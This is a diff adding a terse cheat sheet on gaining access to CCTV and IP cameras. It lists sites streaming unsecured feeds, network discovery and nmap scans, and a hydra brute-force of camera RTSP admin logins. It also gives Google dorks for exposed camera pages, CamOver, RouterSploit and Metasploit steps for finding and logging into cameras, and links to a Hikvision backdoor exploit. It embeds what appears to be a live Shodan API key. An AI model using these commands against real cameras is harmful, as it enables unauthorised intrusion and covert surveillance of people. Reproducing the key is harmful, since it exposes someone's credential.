@@ -1,0 +1,55 @@
+CCTV Online:
+http://www.insecam.org/
+http://www.opentopia.com/
+https://www.earthcam.com/
+
+SOftware:
+https://play.google.com/store/apps/details?id=com.goodidea.network.ipscanner&hl=en&gl=US&pli=1
+https://www.advanced-ip-scanner.com/download/
+
+Process 01:
+sudo netdiscover -r 192.168.1.0/24
+nmap -sV -sC -p- <ip>
+sudo hydra -s 554 -l admin -P password.txt -t 16 <link> rtsp
+
+Dork:
+inurl: view/index.shtml
+inurl:view/view.shtml
+Live applet
+intitle:"Live view" intitle:axis
+intitle:live applet
+intitle:"webcamXP" inurl:8080
+
+CamOver : https://github.com/EntySec/CamOver
+sudo python3 setup.py install
+camover -a 192.168.1.35
+camover -t --shodan QHZllJUWcCUEKfK1aNl6MPq7KPeuFjGq
+
+RouterSploit : https://github.com/threat9/routersploit
+python3 -m pip install -r requirments
+python3 rsf.py
+use scanners/cameras/camera_scan
+show options
+set target <ip>
+run
+
+Metasploit:
+msfconsole
+search cctv
+use auxiliary/scanner/misc/cctv_dvr_login
+show options
+set RHOSTS <ip>
+set RPORT <ip>
+
+Shodan : Hikvision, WebCam
+
+Exploits:
+https://packetstormsecurity.com/files/166334/Hikvision-IP-Camera-Backdoor.html
+https://www.exploit-db.com/exploits/44320
+
+arp-scan --interface wlan0 -l
+nmap <ip>
+
+
+
+
